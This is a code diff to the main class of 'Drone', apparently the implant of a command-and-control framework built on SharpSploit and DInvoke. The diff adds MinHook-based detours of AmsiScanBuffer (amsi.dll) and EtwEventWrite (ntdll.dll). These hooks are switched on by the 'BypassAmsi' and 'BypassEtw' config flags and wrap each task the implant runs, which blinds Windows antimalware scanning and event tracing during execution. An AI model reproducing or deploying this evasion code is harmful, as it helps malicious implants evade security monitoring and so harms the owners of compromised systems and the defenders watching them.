@@ -1,14 +1,18 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Net.Sockets;
 using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+
+using Drone.SharpSploit.Evasion;
+using Drone.DInvoke.DynamicInvoke;
 using Drone.Handlers;
 using Drone.Models;
 using Drone.Modules;
+
+using MinHook;
 
 namespace Drone
 {
@@ -16,7 +20,7 @@ namespace Drone
     {
         private Metadata _metadata;
         private DroneConfig _config;
-        private DroneEvasion _evasion;
+        private HookEngine _hookEngine;
         private Handler _handler;
         private bool _running;
 
@@ -28,8 +32,8 @@ namespace Drone
         public void Start()
         {
             _config = Utilities.GenerateDefaultConfig();
-            _evasion = new DroneEvasion(_config);
             _metadata = Utilities.GenerateMetadata();
+            _hookEngine = new HookEngine();
 
             _handler = GetHandler;
             _handler.Init(_config, _metadata);
@@ -83,8 +87,28 @@ namespace Drone
             {
                 try
                 {
+                    // handle evasion hooks
+                    var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
+                    var bypassEtw = _config.GetConfig<bool>("BypassEtw");
+
+                    if (bypassAmsi)
+                    {
+                        if (Amsi.AmsiScanBufferOriginal is null) CreateAmsiBypassHook();
+                        _hookEngine.EnableHook(Amsi.AmsiScanBufferOriginal);
+                    }
+                    
+                    if (bypassEtw)
+                    {
+                        if (Etw.EtwEventWriteOriginal is null) CreateEtwBypassHook();
+                        _hookEngine.EnableHook(Etw.EtwEventWriteOriginal);
+                    }
+
                     // run the task
                     command?.Callback.Invoke(task, token.Token);
+                    
+                    // unload hooks
+                    if (bypassAmsi) _hookEngine.DisableHook(Amsi.AmsiScanBufferOriginal);
+                    if (bypassEtw) _hookEngine.DisableHook(Etw.EtwEventWriteOriginal);
 
                     // send task complete
                     SendTaskComplete(task.TaskGuid);
@@ -160,8 +184,7 @@ namespace Drone
 
         private void LoadDroneModule(DroneModule module)
         {
-            module.Init(this, _config, _evasion);
-            module.AddCommands();
+            module.Init(this, _config, _hookEngine);
             _modules.Add(module);
             SendModuleLoaded(module);
         }
@@ -190,6 +213,25 @@ namespace Drone
         public void Stop()
         {
             _running = false;
+        }
+
+        private void CreateAmsiBypassHook()
+        {
+            // force dll to load
+            _ = Generic.LoadModuleFromDisk("amsi.dll");
+                            
+            Amsi.AmsiScanBufferOriginal = _hookEngine.CreateHook(
+                "amsi.dll",
+                "AmsiScanBuffer",
+                new Amsi.AmsiScanBufferDelegate(Amsi.AmsiScanBufferDetour));
+        }
+        
+        private void CreateEtwBypassHook()
+        {
+            Etw.EtwEventWriteOriginal = _hookEngine.CreateHook(
+                "ntdll.dll",
+                "EtwEventWrite",
+                new Etw.EtwEventWriteDelegate(Etw.EtwEventWriteDetour));
         }
 
         private void LoadDefaultModules()
